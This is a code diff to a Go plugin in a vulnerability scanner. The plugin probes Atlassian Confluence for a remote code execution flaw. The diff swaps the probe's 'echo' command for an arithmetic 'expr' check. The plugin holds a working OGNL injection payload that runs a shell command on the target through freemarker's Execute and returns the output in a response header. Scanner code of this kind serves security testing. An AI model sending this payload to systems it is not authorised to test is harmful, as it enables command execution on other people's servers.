@@ -3,7 +3,9 @@ package goplugin
 import (
 	"Yscanner/utils"
 	"bytes"
+	"fmt"
 	"net/http"
+	"strconv"
 	"strings"
 )
 
@@ -26,9 +28,10 @@ func (p *atlassian_confluence_rce) Info() PluginInfo {
 }
 
 func (p *atlassian_confluence_rce) Check(netloc string) bool {
-	rand_str := utils.GenRandom(10)
+	rand1 := utils.GenRandomInt(5)
+	rand2 := utils.GenRandomInt(5)
 	payload := `label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({"`
-	payload += "echo " + rand_str
+	payload += fmt.Sprintf("expr %d %%2B %d", rand1, rand2)
 	payload += `"}))`
 
 	req, err := http.NewRequest("POST", netloc+"/template/aui/text-inline.vm", bytes.NewBufferString(payload))
@@ -41,7 +44,7 @@ func (p *atlassian_confluence_rce) Check(netloc string) bool {
 		return false
 	}
 
-	if resp.Other.StatusCode == 200 && strings.Contains(resp.Other.Header.Get("X-Cmd-Response"), rand_str) {
+	if resp.Other.StatusCode == 200 && strings.Contains(resp.Other.Header.Get("X-Cmd-Response"), strconv.Itoa(rand1+rand2)) {
 		return true
 	}
 	return false
